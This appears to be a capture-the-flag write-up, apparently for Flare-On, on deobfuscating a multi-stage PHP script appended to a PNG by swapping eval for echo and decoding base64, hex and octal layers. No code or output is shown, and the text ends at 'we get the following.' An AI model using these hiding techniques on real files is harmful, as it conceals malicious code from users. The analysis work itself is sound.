## Write-up

After extracting the archive we see 2 files. An html page and a 'flare-on.png' inside 'img' directory.
Going through the HTML file it doesn't look like it has anything suspicious in it. So I directed my attention to the PNG file.
At first it looks like a typical PNG file, but using 'strings' on it reveals that there's a PHP script appended to the end of it.

It's a kind of obfuscated :), but if we change the 'eval' to "print" or "echo" and execute it we can see what's behind the obfuscated code.

Ok, we see the second stage of the script. Now, let's do the same, change eval with echo.

And we see that in the third stage the script is base64 decoding the '$_' variable and executing it with eval. We can do the same with changing eval to echo but we already have the base64, let's just do it on the command line this time.

{% highlight bash  %}

I changed the formatting a little just for readability. Now we see a mix of HEX and octal obfuscation. If we convert the keys starting with "\x" from HEX to ASCII and the keys in octal form starting with "\[num]" using python we get the following.
